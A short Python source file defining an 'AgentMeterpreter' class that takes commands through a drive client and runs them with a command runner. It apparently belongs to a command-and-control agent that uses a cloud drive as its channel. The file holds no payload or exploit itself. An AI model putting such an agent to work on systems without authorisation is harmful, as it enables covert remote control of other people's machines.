"""
Agent Meterpreter
"""


from drive.drive_client import DriveClient
from command.command_factory import CommandFactory
from command.command_runner import CommandRunner


class AgentMeterpreter:
    def __init__(self, logger=None):
        self._drive_client = None
        self._agent_id = None
        self._logger = logger
        self._command_factory = CommandFactory()
        self._command_runner = CommandRunner(self._command_factory, logger)
        # Init commands
        self._command_factory.init()

    def get_agent_id(self):
        return self._agent_id

    def init(self, drive_client: DriveClient, agent_id: str):
        self._command_runner.init(drive_client, "/" + agent_id)

    def cleanup(self):
        self._command_runner.cleanup()

    def run_command(self, name: str, args: dict):
        if name == "reset":
            self._command_runner.reset()
        else:
            self._command_runner.run(name, args)
            self._command_runner.wait_for_finish(30)

    def get_command_names(self):
        names = self._command_factory.get_command_names()
        names.append("reset")
        return names
